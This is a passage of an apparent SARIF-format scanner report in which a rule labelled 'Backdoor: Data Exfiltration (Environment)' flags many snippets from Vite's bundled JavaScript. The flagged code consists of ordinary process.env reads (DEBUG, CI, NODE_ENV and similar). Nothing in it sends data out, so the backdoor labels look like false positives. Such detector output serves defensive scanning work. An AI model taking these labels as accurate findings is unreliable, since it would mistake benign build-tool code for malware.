                    "text": "  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n",
                    "rendered": {
                      "text": "  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n",
                      "markdown": "`  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n  }\n  if (parsed.BROWSER_ARGS && process.env.BROWSER_ARGS === void 0) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34874,
                  "startColumn": 4,
                  "endLine": 34874,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    })\n  );\n  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n",
                    "rendered": {
                      "text": "    })\n  );\n  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n",
                      "markdown": "`    })\n  );\n  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n    process.env.BROWSER = parsed.BROWSER;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34873,
                  "startColumn": 25,
                  "endLine": 34873,
                  "endColumn": 36,
                  "snippet": {
                    "text": "      return Object.entries(parse_1$1(fs__default.readFileSync(filePath)));\n    })\n  );\n  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n",
                    "rendered": {
                      "text": "      return Object.entries(parse_1$1(fs__default.readFileSync(filePath)));\n    })\n  );\n  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n",
                      "markdown": "`      return Object.entries(parse_1$1(fs__default.readFileSync(filePath)));\n    })\n  );\n  if (parsed.NODE_ENV && process.env.VITE_USER_NODE_ENV === void 0) {\n    process.env.VITE_USER_NODE_ENV = parsed.NODE_ENV;\n  }\n  if (parsed.BROWSER && process.env.BROWSER === void 0) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 33714,
                  "startColumn": 4,
                  "endLine": 33714,
                  "endColumn": 15,
                  "snippet": {
                    "text": "  }, ctx);\n\n  if (!ctx.env) {\n    process.env.NODE_ENV = 'development';\n  }\n\n  return ctx\n",
                    "rendered": {
                      "text": "  }, ctx);\n\n  if (!ctx.env) {\n    process.env.NODE_ENV = 'development';\n  }\n\n  return ctx\n",
                      "markdown": "`  }, ctx);\n\n  if (!ctx.env) {\n    process.env.NODE_ENV = 'development';\n  }\n\n  return ctx\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 33710,
                  "startColumn": 9,
                  "endLine": 33710,
                  "endColumn": 20,
                  "snippet": {
                    "text": "   */\n  ctx = Object.assign({\n    cwd: process.cwd(),\n    env: process.env.NODE_ENV\n  }, ctx);\n\n  if (!ctx.env) {\n",
                    "rendered": {
                      "text": "   */\n  ctx = Object.assign({\n    cwd: process.cwd(),\n    env: process.env.NODE_ENV\n  }, ctx);\n\n  if (!ctx.env) {\n",
                      "markdown": "`   */\n  ctx = Object.assign({\n    cwd: process.cwd(),\n    env: process.env.NODE_ENV\n  }, ctx);\n\n  if (!ctx.env) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17804,
                  "startColumn": 39,
                  "endLine": 17804,
                  "endColumn": 50,
                  "snippet": {
                    "text": "  const displaySize = (bytes) => {\n    return `${numberFormatter.format(bytes / 1e3)} kB`;\n  };\n  const tty = process.stdout.isTTY && !process.env.CI;\n  const shouldLogInfo = LogLevels[config.logLevel || \"info\"] >= LogLevels.info;\n  let hasTransformed = false;\n  let hasRenderedChunk = false;\n",
                    "rendered": {
                      "text": "  const displaySize = (bytes) => {\n    return `${numberFormatter.format(bytes / 1e3)} kB`;\n  };\n  const tty = process.stdout.isTTY && !process.env.CI;\n  const shouldLogInfo = LogLevels[config.logLevel || \"info\"] >= LogLevels.info;\n  let hasTransformed = false;\n  let hasRenderedChunk = false;\n",
                      "markdown": "`  const displaySize = (bytes) => {\n    return `${numberFormatter.format(bytes / 1e3)} kB`;\n  };\n  const tty = process.stdout.isTTY && !process.env.CI;\n  const shouldLogInfo = LogLevels[config.logLevel || \"info\"] >= LogLevels.info;\n  let hasTransformed = false;\n  let hasRenderedChunk = false;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17696,
                  "startColumn": 70,
                  "endLine": 17696,
                  "endColumn": 81,
                  "snippet": {
                    "text": "  const loggedErrors = /* @__PURE__ */ new WeakSet();\n  const { prefix = \"[vite]\", allowClearScreen = true } = options;\n  const thresh = LogLevels[level];\n  const canClearScreen = allowClearScreen && process.stdout.isTTY && !process.env.CI;\n  const clear = canClearScreen ? clearScreen : () => {\n  };\n  function format(type, msg, options2 = {}) {\n",
                    "rendered": {
                      "text": "  const loggedErrors = /* @__PURE__ */ new WeakSet();\n  const { prefix = \"[vite]\", allowClearScreen = true } = options;\n  const thresh = LogLevels[level];\n  const canClearScreen = allowClearScreen && process.stdout.isTTY && !process.env.CI;\n  const clear = canClearScreen ? clearScreen : () => {\n  };\n  function format(type, msg, options2 = {}) {\n",
                      "markdown": "`  const loggedErrors = /* @__PURE__ */ new WeakSet();\n  const { prefix = \"[vite]\", allowClearScreen = true } = options;\n  const thresh = LogLevels[level];\n  const canClearScreen = allowClearScreen && process.stdout.isTTY && !process.env.CI;\n  const clear = canClearScreen ? clearScreen : () => {\n  };\n  function format(type, msg, options2 = {}) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17659,
                  "startColumn": 6,
                  "endLine": 17659,
                  "endColumn": 17,
                  "snippet": {
                    "text": "};\nconst teardownSIGTERMListener = (callback) => {\n  process.off(\"SIGTERM\", callback);\n  if (process.env.CI !== \"true\") {\n    process.stdin.off(\"end\", callback);\n  }\n};\n",
                    "rendered": {
                      "text": "};\nconst teardownSIGTERMListener = (callback) => {\n  process.off(\"SIGTERM\", callback);\n  if (process.env.CI !== \"true\") {\n    process.stdin.off(\"end\", callback);\n  }\n};\n",
                      "markdown": "`};\nconst teardownSIGTERMListener = (callback) => {\n  process.off(\"SIGTERM\", callback);\n  if (process.env.CI !== \"true\") {\n    process.stdin.off(\"end\", callback);\n  }\n};\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17653,
                  "startColumn": 6,
                  "endLine": 17653,
                  "endColumn": 17,
                  "snippet": {
                    "text": "}\nconst setupSIGTERMListener = (callback) => {\n  process.once(\"SIGTERM\", callback);\n  if (process.env.CI !== \"true\") {\n    process.stdin.on(\"end\", callback);\n  }\n};\n",
                    "rendered": {
                      "text": "}\nconst setupSIGTERMListener = (callback) => {\n  process.once(\"SIGTERM\", callback);\n  if (process.env.CI !== \"true\") {\n    process.stdin.on(\"end\", callback);\n  }\n};\n",
                      "markdown": "`}\nconst setupSIGTERMListener = (callback) => {\n  process.once(\"SIGTERM\", callback);\n  if (process.env.CI !== \"true\") {\n    process.stdin.on(\"end\", callback);\n  }\n};\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 17581,
                  "startColumn": 25,
                  "endLine": 17581,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  return str.replace(escapeRegexRE, \"\\\\$&\");\n}\nfunction getPackageManagerCommand(type = \"install\") {\n  const packageManager = process.env.npm_config_user_agent?.split(\" \")[0].split(\"/\")[0] || \"npm\";\n  switch (type) {\n    case \"install\":\n      return packageManager === \"npm\" ? \"npm install\" : `${packageManager} add`;\n",
                    "rendered": {
                      "text": "  return str.replace(escapeRegexRE, \"\\\\$&\");\n}\nfunction getPackageManagerCommand(type = \"install\") {\n  const packageManager = process.env.npm_config_user_agent?.split(\" \")[0].split(\"/\")[0] || \"npm\";\n  switch (type) {\n    case \"install\":\n      return packageManager === \"npm\" ? \"npm install\" : `${packageManager} add`;\n",
                      "markdown": "`  return str.replace(escapeRegexRE, \"\\\\$&\");\n}\nfunction getPackageManagerCommand(type = \"install\") {\n  const packageManager = process.env.npm_config_user_agent?.split(\" \")[0].split(\"/\")[0] || \"npm\";\n  switch (type) {\n    case \"install\":\n      return packageManager === \"npm\" ? \"npm install\" : `${packageManager} add`;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16767,
                  "startColumn": 14,
                  "endLine": 16767,
                  "endColumn": 25,
                  "snippet": {
                    "text": "}\nconst rollupVersion = resolveDependencyVersion(\"rollup\");\nconst filter = process.env.VITE_DEBUG_FILTER;\nconst DEBUG = process.env.DEBUG;\nfunction createDebugger(namespace, options = {}) {\n  const log = debug$i(namespace);\n  const { onlyWhenFocused } = options;\n",
                    "rendered": {
                      "text": "}\nconst rollupVersion = resolveDependencyVersion(\"rollup\");\nconst filter = process.env.VITE_DEBUG_FILTER;\nconst DEBUG = process.env.DEBUG;\nfunction createDebugger(namespace, options = {}) {\n  const log = debug$i(namespace);\n  const { onlyWhenFocused } = options;\n",
                      "markdown": "`}\nconst rollupVersion = resolveDependencyVersion(\"rollup\");\nconst filter = process.env.VITE_DEBUG_FILTER;\nconst DEBUG = process.env.DEBUG;\nfunction createDebugger(namespace, options = {}) {\n  const log = debug$i(namespace);\n  const { onlyWhenFocused } = options;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16766,
                  "startColumn": 15,
                  "endLine": 16766,
                  "endColumn": 26,
                  "snippet": {
                    "text": "  return JSON.parse(fs__default.readFileSync(pkgPath, \"utf-8\")).version;\n}\nconst rollupVersion = resolveDependencyVersion(\"rollup\");\nconst filter = process.env.VITE_DEBUG_FILTER;\nconst DEBUG = process.env.DEBUG;\nfunction createDebugger(namespace, options = {}) {\n  const log = debug$i(namespace);\n",
                    "rendered": {
                      "text": "  return JSON.parse(fs__default.readFileSync(pkgPath, \"utf-8\")).version;\n}\nconst rollupVersion = resolveDependencyVersion(\"rollup\");\nconst filter = process.env.VITE_DEBUG_FILTER;\nconst DEBUG = process.env.DEBUG;\nfunction createDebugger(namespace, options = {}) {\n  const log = debug$i(namespace);\n",
                      "markdown": "`  return JSON.parse(fs__default.readFileSync(pkgPath, \"utf-8\")).version;\n}\nconst rollupVersion = resolveDependencyVersion(\"rollup\");\nconst filter = process.env.VITE_DEBUG_FILTER;\nconst DEBUG = process.env.DEBUG;\nfunction createDebugger(namespace, options = {}) {\n  const log = debug$i(namespace);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16429,
                  "startColumn": 10,
                  "endLine": 16429,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\t\t */\n\n\t\tfunction load() {\n\t\t\treturn process.env.DEBUG;\n\t\t}\n\n\t\t/**\n",
                    "rendered": {
                      "text": "\t\t */\n\n\t\tfunction load() {\n\t\t\treturn process.env.DEBUG;\n\t\t}\n\n\t\t/**\n",
                      "markdown": "`\t\t */\n\n\t\tfunction load() {\n\t\t\treturn process.env.DEBUG;\n\t\t}\n\n\t\t/**\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16417,
                  "startColumn": 11,
                  "endLine": 16417,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n\t\t}\n\n",
                    "rendered": {
                      "text": "\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n\t\t}\n\n",
                      "markdown": "`\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n\t\t\t\tdelete process.env.DEBUG;\n\t\t\t}\n\t\t}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16413,
                  "startColumn": 4,
                  "endLine": 16413,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\t\t */\n\t\tfunction save(namespaces) {\n\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n",
                    "rendered": {
                      "text": "\t\t */\n\t\tfunction save(namespaces) {\n\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n",
                      "markdown": "`\t\t */\n\t\tfunction save(namespaces) {\n\t\t\tif (namespaces) {\n\t\t\t\tprocess.env.DEBUG = namespaces;\n\t\t\t} else {\n\t\t\t\t// If you set a process.env field to null or undefined, it gets cast to the\n\t\t\t\t// string 'null' or 'undefined'. Just delete instead.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16344,
                  "startColumn": 13,
                  "endLine": 16344,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\t\t\t\t});\n\n\t\t\t// Coerce string value into JS value\n\t\t\tlet val = process.env[key];\n\t\t\tif (/^(yes|on|true|enabled)$/i.test(val)) {\n\t\t\t\tval = true;\n\t\t\t} else if (/^(no|off|false|disabled)$/i.test(val)) {\n",
                    "rendered": {
                      "text": "\t\t\t\t});\n\n\t\t\t// Coerce string value into JS value\n\t\t\tlet val = process.env[key];\n\t\t\tif (/^(yes|on|true|enabled)$/i.test(val)) {\n\t\t\t\tval = true;\n\t\t\t} else if (/^(no|off|false|disabled)$/i.test(val)) {\n",
                      "markdown": "`\t\t\t\t});\n\n\t\t\t// Coerce string value into JS value\n\t\t\tlet val = process.env[key];\n\t\t\tif (/^(yes|on|true|enabled)$/i.test(val)) {\n\t\t\t\tval = true;\n\t\t\t} else if (/^(no|off|false|disabled)$/i.test(val)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16332,
                  "startColumn": 36,
                  "endLine": 16332,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(key => {\n\t\t\treturn /^debug_/i.test(key);\n\t\t}).reduce((obj, key) => {\n\t\t\t// Camel-case\n",
                    "rendered": {
                      "text": "\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(key => {\n\t\t\treturn /^debug_/i.test(key);\n\t\t}).reduce((obj, key) => {\n\t\t\t// Camel-case\n",
                      "markdown": "`\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(key => {\n\t\t\treturn /^debug_/i.test(key);\n\t\t}).reduce((obj, key) => {\n\t\t\t// Camel-case\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 16154,
                  "startColumn": 8,
                  "endLine": 16154,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n\t\t\t// If debug isn't set in LS, and we're in Electron, try to load $DEBUG\n\t\t\tif (!r && typeof process !== 'undefined' && 'env' in process) {\n\t\t\t\tr = process.env.DEBUG;\n\t\t\t}\n\n\t\t\treturn r;\n",
                    "rendered": {
                      "text": "\n\t\t\t// If debug isn't set in LS, and we're in Electron, try to load $DEBUG\n\t\t\tif (!r && typeof process !== 'undefined' && 'env' in process) {\n\t\t\t\tr = process.env.DEBUG;\n\t\t\t}\n\n\t\t\treturn r;\n",
                      "markdown": "`\n\t\t\t// If debug isn't set in LS, and we're in Electron, try to load $DEBUG\n\t\t\tif (!r && typeof process !== 'undefined' && 'env' in process) {\n\t\t\t\tr = process.env.DEBUG;\n\t\t\t}\n\n\t\t\treturn r;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 4023,
                  "startColumn": 8,
                  "endLine": 4023,
                  "endColumn": 19,
                  "snippet": {
                    "text": "const defaultPlatform$2 = (typeof process === 'object' && process\n    ? (typeof process.env === 'object' &&\n        process.env &&\n        process.env.__MINIMATCH_TESTING_PLATFORM__) ||\n        process.platform\n    : 'posix');\nconst path$j = {\n",
                    "rendered": {
                      "text": "const defaultPlatform$2 = (typeof process === 'object' && process\n    ? (typeof process.env === 'object' &&\n        process.env &&\n        process.env.__MINIMATCH_TESTING_PLATFORM__) ||\n        process.platform\n    : 'posix');\nconst path$j = {\n",
                      "markdown": "`const defaultPlatform$2 = (typeof process === 'object' && process\n    ? (typeof process.env === 'object' &&\n        process.env &&\n        process.env.__MINIMATCH_TESTING_PLATFORM__) ||\n        process.platform\n    : 'posix');\nconst path$j = {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 4022,
                  "startColumn": 8,
                  "endLine": 4022,
                  "endColumn": 19,
                  "snippet": {
                    "text": "/* c8 ignore start */\nconst defaultPlatform$2 = (typeof process === 'object' && process\n    ? (typeof process.env === 'object' &&\n        process.env &&\n        process.env.__MINIMATCH_TESTING_PLATFORM__) ||\n        process.platform\n    : 'posix');\n",
                    "rendered": {
                      "text": "/* c8 ignore start */\nconst defaultPlatform$2 = (typeof process === 'object' && process\n    ? (typeof process.env === 'object' &&\n        process.env &&\n        process.env.__MINIMATCH_TESTING_PLATFORM__) ||\n        process.platform\n    : 'posix');\n",
                      "markdown": "`/* c8 ignore start */\nconst defaultPlatform$2 = (typeof process === 'object' && process\n    ? (typeof process.env === 'object' &&\n        process.env &&\n        process.env.__MINIMATCH_TESTING_PLATFORM__) ||\n        process.platform\n    : 'posix');\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 4021,
                  "startColumn": 14,
                  "endLine": 4021,
                  "endColumn": 25,
                  "snippet": {
                    "text": "};\n/* c8 ignore start */\nconst defaultPlatform$2 = (typeof process === 'object' && process\n    ? (typeof process.env === 'object' &&\n        process.env &&\n        process.env.__MINIMATCH_TESTING_PLATFORM__) ||\n        process.platform\n",
                    "rendered": {
                      "text": "};\n/* c8 ignore start */\nconst defaultPlatform$2 = (typeof process === 'object' && process\n    ? (typeof process.env === 'object' &&\n        process.env &&\n        process.env.__MINIMATCH_TESTING_PLATFORM__) ||\n        process.platform\n",
                      "markdown": "`};\n/* c8 ignore start */\nconst defaultPlatform$2 = (typeof process === 'object' && process\n    ? (typeof process.env === 'object' &&\n        process.env &&\n        process.env.__MINIMATCH_TESTING_PLATFORM__) ||\n        process.platform\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 94,
                  "startColumn": 9,
                  "endLine": 94,
                  "endColumn": 20,
                  "snippet": {
